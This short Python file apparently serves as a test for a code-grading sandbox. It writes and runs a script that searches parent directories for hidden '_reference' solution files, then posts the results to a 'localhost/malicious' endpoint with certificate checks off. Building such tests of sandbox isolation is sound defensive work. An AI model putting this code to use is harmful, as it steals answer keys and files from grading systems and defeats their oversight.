import os

malicious_code1 = """import glob
x = glob.glob("**/_reference/*.py", root_dir="../../../../", recursive=True)
print("\\n".join(x))
print("yeah hacked you")
"""

malicious_code2 = """import subprocess
result = subprocess.run("python malicious_file1.py", shell=True, capture_output=True)
data = result.stdout.decode()
print(data)
import requests
url = 'https://localhost/malicious'
headers = {'Content-Type': 'text/plain'}
r = requests.post(url, data=data, headers=headers, verify=False)
print(r.text)
"""

os.chdir(os.path.dirname(__file__))
with open("malicious_file1.py", "w") as f: f.write(malicious_code1)
exec(compile(malicious_code2, "", "exec"), {})

var1 = "xyz"

#$VARIABLETEST variables test-1
#$TESTVAR var1
